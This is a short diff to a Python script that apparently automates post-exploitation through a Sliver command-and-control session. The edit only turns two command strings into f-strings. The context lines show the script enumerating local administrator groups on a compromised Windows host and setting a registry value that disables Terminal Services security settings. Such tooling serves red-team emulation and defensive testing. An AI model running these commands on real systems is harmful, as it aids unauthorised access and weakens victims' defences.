@@ -63,7 +63,7 @@ async def main():
     sliver_sessionid = await sliver_executor.select_sessions()
 
     confirm_action()
-    commands = """
+    commands = f"""
     net localgroup
     net localgroup "Administrators"
     """
@@ -254,7 +254,7 @@ async def main():
     print_finished_message()
 
     confirm_action()
-    commands = """
+    commands = f"""
     reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services" /v "DisableSecuritySettings" /t REG_DWORD /d 1 /f
     """
     await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)
